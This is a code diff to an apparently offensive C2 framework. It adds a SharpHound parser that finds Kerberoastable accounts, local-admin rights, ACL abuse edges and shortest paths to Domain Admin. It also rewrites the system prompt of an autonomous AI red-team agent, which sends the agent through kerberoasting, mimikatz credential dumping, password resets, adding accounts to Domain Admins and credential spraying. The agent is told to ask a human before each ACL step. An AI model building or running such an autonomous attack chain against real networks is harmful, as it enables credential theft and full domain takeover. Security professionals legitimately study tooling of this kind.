@@ -180,6 +180,163 @@ def c2_run_sharphound(agent_id: str) -> str:
 
 
 @tool
+def c2_analyze_sharphound(agent_id: str) -> str:
+    """
+    Parse the latest SharpHound ZIP from loot and extract the full attack graph.
+    Returns:
+      - Domain info and Domain Controllers
+      - Kerberoastable accounts
+      - Local admin relationships (who can admin which machine)
+      - ACL attack edges (GenericAll, WriteDACL, ForceChangePassword, AddMember, etc.)
+      - All attack paths to Domain Admin with step-by-step chains
+    Call this immediately after c2_run_sharphound to plan the attack chain.
+    """
+    from collections import deque
+
+    agent_loot = LOOT_DIR / agent_id
+    if not agent_loot.is_dir():
+        return f"[error] No loot directory for agent {agent_id}"
+
+    zips = sorted(agent_loot.glob("*.zip"), key=lambda p: p.stat().st_mtime, reverse=True)
+    if not zips:
+        return "[error] No SharpHound ZIP found. Run c2_run_sharphound first."
+
+    try:
+        sh_data = _gm.load_sharphound(str(zips[0]))
+        sid_map = _gm.index_objects(sh_data)
+    except Exception as e:
+        return f"[error] Failed to parse SharpHound ZIP: {e}"
+
+    lines = []
+
+    # ── Domain info ──────────────────────────────────────────────────────────
+    domain_obj = next((o for o in sid_map.values() if o["type"] == "domain"), None)
+    domain_name = domain_obj["full_name"].split("@")[-1] if domain_obj else "UNKNOWN"
+    dc_list = [o for o in sid_map.values() if o["type"] == "dc"]
+
+    lines.append("=== DOMAIN INFO ===")
+    lines.append(f"Domain: {domain_name}")
+    for dc in dc_list:
+        lines.append(f"DC: {dc['props'].get('name', dc['full_name'])}")
+    lines.append("")
+
+    # ── Kerberoastable accounts ───────────────────────────────────────────────
+    kerb = [o for o in sid_map.values()
+            if o["type"] in ("user", "user_da") and o["props"].get("serviceprincipalnames")]
+    if kerb:
+        lines.append("=== KERBEROASTABLE ACCOUNTS ===")
+        for u in kerb:
+            spns = u["props"].get("serviceprincipalnames", [])
+            lines.append(f"• {u['full_name']}  (SPN: {', '.join(spns[:2])})")
+        lines.append("")
+
+    # ── Local admin relationships ────────────────────────────────────────────
+    _IMPLICIT = {"DOMAIN ADMINS", "ENTERPRISE ADMINS", "SCHEMA ADMINS", "ADMINISTRATORS"}
+    local_admins = []
+    for sid, obj in sid_map.items():
+        if obj["type"] not in ("dc", "computer", "workstation"):
+            continue
+        container = obj["raw"].get("LocalAdmins", {})
+        results = container.get("Results", []) if isinstance(container, dict) else container
+        for r in results:
+            r_sid = (r.get("ObjectIdentifier") or r.get("PrincipalSID") or "").upper()
+            r_obj = sid_map.get(r_sid)
+            if r_obj and r_obj["name"] not in _IMPLICIT:
+                local_admins.append((r_obj["full_name"], obj["full_name"], r_obj["type"]))
+
+    if local_admins:
+        lines.append("=== LOCAL ADMIN RELATIONSHIPS ===")
+        for admin, machine, atype in local_admins:
+            lines.append(f"• {admin} ({atype})  →  LOCAL ADMIN  →  {machine}")
+        lines.append("")
+
+    # ── ACL attack edges ─────────────────────────────────────────────────────
+    _ACL_RIGHTS = {"GenericAll", "GenericWrite", "WriteOwner", "WriteDacl",
+                   "ForceChangePassword", "AllExtendedRights", "AddMember", "Owns"}
+    acl_edges = []
+    for sid, obj in sid_map.items():
+        for ace in obj.get("aces", []):
+            right = ace.get("RightName", "")
+            if right not in _ACL_RIGHTS:
+                continue
+            p_sid = ace.get("PrincipalSID", "").upper()
+            p_obj = sid_map.get(p_sid)
+            if not p_obj or p_obj["name"] in _IMPLICIT:
+                continue
+            acl_edges.append((p_obj["full_name"], right, obj["full_name"], obj["type"]))
+
+    if acl_edges:
+        lines.append("=== ACL ATTACK EDGES ===")
+        for src, right, tgt, tgt_type in acl_edges:
+            lines.append(f"• {src}  --[{right}]-->  {tgt}  (target type: {tgt_type})")
+        lines.append("")
+
+    # ── Attack paths to DA (BFS) ──────────────────────────────────────────────
+    # Build adjacency: sid → [(next_sid, edge_label)]
+    adj: dict = {}
+    for sid, obj in sid_map.items():
+        for ace in obj.get("aces", []):
+            right = ace.get("RightName", "")
+            if right not in _ACL_RIGHTS:
+                continue
+            p_sid = ace.get("PrincipalSID", "").upper()
+            if p_sid in sid_map:
+                adj.setdefault(p_sid, []).append((sid, right))
+        if obj["type"] == "group":
+            for m in obj["raw"].get("Members", []):
+                m_sid = m.get("ObjectIdentifier", "").upper()
+                if m_sid in sid_map:
+                    adj.setdefault(m_sid, []).append((sid, "MemberOf"))
+
+    _PRIV_NAMES = {"DOMAIN ADMINS", "ENTERPRISE ADMINS", "ADMINISTRATORS"}
+    targets = {sid for sid, o in sid_map.items()
+               if o["type"] == "user_da" or o["name"] in _PRIV_NAMES}
+    sources = [(sid, o) for sid, o in sid_map.items() if o["type"] in ("user", "user_disabled")]
+
+    all_paths = []
+    for start_sid, _ in sources:
+        if start_sid in targets:
+            continue
+        queue: deque = deque([(start_sid, [(start_sid, None)])])
+        visited = {start_sid}
+        while queue:
+            cur, path = queue.popleft()
+            if cur in targets:
+                all_paths.append(path)
+                break
+            for nxt, lbl in adj.get(cur, []):
+                if nxt not in visited:
+                    visited.add(nxt)
+                    queue.append((nxt, path + [(nxt, lbl)]))
+
+    if all_paths:
+        all_paths.sort(key=len)
+        lines.append("=== ATTACK PATHS TO DOMAIN ADMIN ===")
+        for i, path in enumerate(all_paths[:5]):
+            parts = [sid_map.get(path[0][0], {}).get("name", path[0][0])]
+            for sid, lbl in path[1:]:
+                parts.append(f"--[{lbl}]-->")
+                parts.append(sid_map.get(sid, {}).get("name", sid))
+            lines.append(f"Path {i+1} ({len(path)-1} hops): {' '.join(parts)}")
+        lines.append("")
+
+        lines.append("=== RECOMMENDED ATTACK SEQUENCE (SHORTEST PATH) ===")
+        shortest = all_paths[0]
+        start_obj = sid_map.get(shortest[0][0], {})
+        lines.append(f"Starting principal: {start_obj.get('full_name', shortest[0][0])}")
+        lines.append("Steps:")
+        for j, (sid, lbl) in enumerate(shortest[1:], 1):
+            tgt = sid_map.get(sid, {})
+            lines.append(f"  Step {j}: [{lbl}] on {tgt.get('full_name', sid)} (type: {tgt.get('type', '?')})")
+        lines.append("")
+
+    if not local_admins and not acl_edges and not all_paths:
+        lines.append("(No exploitable relationships found in this SharpHound dataset.)")
+
+    return "\n".join(lines)
+
+
+@tool
 def c2_run_certipy(agent_id: str, args: str) -> str:
     """
     Run certipy on the agent for ADCS certificate template enumeration.
@@ -435,45 +592,91 @@ class C2AgentState(TypedDict):
 
 
 _SYSTEM_PROMPT = """You are an autonomous red-team AI agent integrated into the Lat-Mov-Auto C2 framework.
-Your mission: execute a complete attack chain against a target subnet, from initial recon to privilege escalation, and then generate a network intelligence map.
+Your mission: execute a complete attack chain — recon → AD enumeration → credential harvesting → attack path execution → DA.
 
 MEMORY FROM PREVIOUS SESSIONS:
 {memories}
 
-
-ATTACK CHAIN (execute in order, adapt based on findings):
-
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 PHASE 1 — DISCOVERY
-  1. c2_list_agents()                              → pick the best agent (prefer most recently seen)
-  2. c2_run_recon(agent_id, subnet)                → port-scan the subnet, discover hosts
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+1. c2_list_agents()                     → pick agent with most recent last_seen
+2. c2_run_recon(agent_id, subnet)       → port-scan, find hosts + DC IPs
 
-PHASE 2 — ACTIVE DIRECTORY ENUMERATION
-  3. c2_run_sharphound(agent_id)                   → BloodHound AD collection
-  4. If a Domain Controller was found in recon:
-     c2_run_certipy(agent_id, "find -u <user>@<domain> -p <pass> -dc-ip <dc_ip> -json")
-     → skip certipy if you don't have credentials yet
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+PHASE 2 — AD ENUMERATION + ANALYSIS + VISUALIZATION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+3. c2_run_sharphound(agent_id)          → BloodHound collection, ZIP uploaded to loot
+4. c2_analyze_sharphound(agent_id)      → parse ZIP, extract full attack graph:
+     • Local admin relationships  (user/group → LOCAL ADMIN → machine)
+     • ACL attack edges           (GenericAll, ForceChangePassword, WriteDACL, AddMember …)
+     • All attack paths to DA     (step-by-step chains from any user to Domain Admin)
+     • Kerberoastable accounts
+   READ this output carefully — it drives everything in Phase 4.
+5. c2_generate_map(agent_id)            → generate network_map.html visualization
 
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 PHASE 3 — CREDENTIAL HARVESTING
-  5. c2_run_kerberoast(agent_id)                   → enumerate SPN accounts, get TGS hashes
-  6. If tools like mimikatz are available in server/files/:
-     c2_run_secretsdump(agent_id, "mimikatz.exe sekurlsa::logonpasswords exit")
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+6. c2_run_kerberoast(agent_id)          → TGS hashes for kerberoastable accounts
+7. c2_run_secretsdump(agent_id, "mimikatz.exe sekurlsa::logonpasswords exit")
+   → only if mimikatz.exe is in server/files/
+8. c2_get_credentials()                 → list ALL credentials now in the DB
 
-PHASE 4 — LATERAL MOVEMENT
-  7. c2_get_credentials()                          → check what creds we have
-  8. For each interesting host: c2_authenticate(agent_id, user, pass, target_ip)
-  9. c2_spray(agent_id, target_ip)                 → try all creds on all lateral targets
- 10. If BloodHound reveals ACL paths: c2_aclabuse(agent_id, operation, args)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+PHASE 4 — ATTACK EXECUTION (credential-driven, SharpHound-guided)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Cross-reference the credentials from Phase 3 with the SharpHound analysis from Phase 2.
+Execute BOTH paths A and B whenever matches are found:
 
-PHASE 5 — MAP GENERATION
- 11. c2_generate_map(agent_id)                     → produce network_map.html
+  ── PATH A: LOCAL ADMIN → SECRETSDUMP ──────────────────────
+  For every LOCAL ADMIN relationship in the analysis output:
+    1. Check if you have credentials in the DB for that admin user
+    2. If YES:
+       a. c2_authenticate(agent_id, username, password, target_ip, service)
+          → verifies the credentials work on the target
+       b. If access confirmed → c2_run_secretsdump(agent_id, "mimikatz.exe ...")
+          → dumps credentials from the target machine
+       c. c2_get_credentials() → update your view of available creds
+    Example: analysis says "jsmith → LOCAL ADMIN → CORPSRV01" and you have jsmith:Password1
+      → c2_authenticate(agent_id, "jsmith", "Password1", "10.0.2.20", "winrm")
+      → c2_run_secretsdump(agent_id, "mimikatz.exe sekurlsa::logonpasswords exit")
 
-RULES:
-- Always call c2_list_agents() first — you need a live agent_id before queuing any task.
-- After each task, analyze the output to decide the next step.
-- If a step fails or returns no data, skip it and continue to the next phase.
-- Before any ACL abuse or privilege-escalating action, use c2_ask_human to confirm.
-- Always end with c2_generate_map — even if earlier phases were incomplete.
-- Do NOT loop or retry indefinitely. If a task times out, move on.
+  ── PATH B: ACL CHAIN → DOMAIN ADMIN ───────────────────────
+  For every ATTACK PATH in the analysis output:
+    1. Check if you have credentials for the STARTING PRINCIPAL of that path
+    2. If YES: execute each step in the chain one at a time:
+       - Before EVERY step: call c2_ask_human() to confirm
+       - Use c2_aclabuse() for each ACL operation
+       - After ForceChangePassword: the new password is the one you set — use it next
+       - After AddMember to Domain Admins: the chain is complete
+    Example path: "jsmith --[ForceChangePassword]--> svc_backup --[AddMember]--> Domain Admins"
+    And you have jsmith credentials:
+      Step 1: c2_ask_human("Ready to ForceChangePassword on svc_backup using jsmith. Proceed?")
+              c2_aclabuse(agent_id, "forcechangepassword", "svc_backup NewP@ssw0rd!")
+      Step 2: c2_ask_human("Ready to AddMember: add svc_backup to Domain Admins. Proceed?")
+              c2_aclabuse(agent_id, "addmember", "Domain Admins svc_backup")
+
+  ── FALLBACK: CREDENTIAL SPRAY ──────────────────────────────
+  If no credential matches found in paths A or B:
+    c2_spray(agent_id, target_ip)   → try all creds on all lateral targets
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+PHASE 5 — ADCS (optional)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+If a DC was found and credentials are available:
+  c2_run_certipy(agent_id, "find -u <user>@<domain> -p <pass> -dc-ip <dc_ip> -json")
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+RULES
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+- ALWAYS start with c2_list_agents() — you need agent_id before anything else.
+- ALWAYS call c2_analyze_sharphound() right after c2_run_sharphound() — this is mandatory.
+- ALWAYS cross-reference c2_get_credentials() with the analysis before Phase 4.
+- ALWAYS call c2_ask_human() before every ACL abuse or destructive action.
+- If a task fails or times out → skip it, continue to the next step.
+- Do NOT retry indefinitely.
+- Always end with c2_generate_map() even if earlier phases were incomplete.
 
 Current date/time: {datetime}
 """
@@ -510,6 +713,7 @@ class C2Agent:
             c2_get_loot,
             c2_run_recon,
             c2_run_sharphound,
+            c2_analyze_sharphound,
             c2_run_certipy,
             c2_run_kerberoast,
             c2_run_secretsdump,
